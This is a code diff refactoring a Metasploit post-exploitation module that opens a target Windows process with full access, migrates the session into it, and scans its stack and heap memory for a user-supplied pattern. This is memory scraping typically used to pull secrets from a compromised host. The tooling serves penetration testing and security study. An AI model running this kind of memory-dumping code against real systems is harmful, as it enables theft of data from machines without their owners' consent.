@@ -31,7 +31,8 @@ class Metasploit3 < Msf::Post
 		], self.class)
 	end
 
-	def get_data_from_stack(proc)
+	def get_data_from_stack(target_pid)
+		proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 		stack = []
 		begin
 			threads = proc.thread.each_thread do |tid|
@@ -53,14 +54,14 @@ class Metasploit3 < Msf::Post
 		stack
 	end
 
-	def get_data_from_heap(proc, target_pid)
+	def get_data_from_heap(target_pid)
 		# we need to be inside the process to walk the heap using railgun
-		current = client.sys.process.getpid
 		heap = []
-		if target_pid != current
+		if target_pid != client.sys.process.getpid
 			print_status("Migrating into #{target_pid} to allow for dumping heap data")
 			session.core.migrate(target_pid)
 		end
+		proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
 		railgun = session.railgun
 		heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
@@ -103,10 +104,8 @@ class Metasploit3 < Msf::Post
 
 	def dump_data(target_pid)
 		regex = datastore['REGEX']
-		proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
-
-		get_data_from_stack(proc).each do |mem|
+		get_data_from_stack(target_pid).each do |mem|
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
@@ -122,7 +121,7 @@ class Metasploit3 < Msf::Post
 		# then let's bail.
 		return unless datastore['HEAP']
 
-		get_data_from_heap(proc, target_pid).each do |mem|
+		get_data_from_heap(target_pid).each do |mem|
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
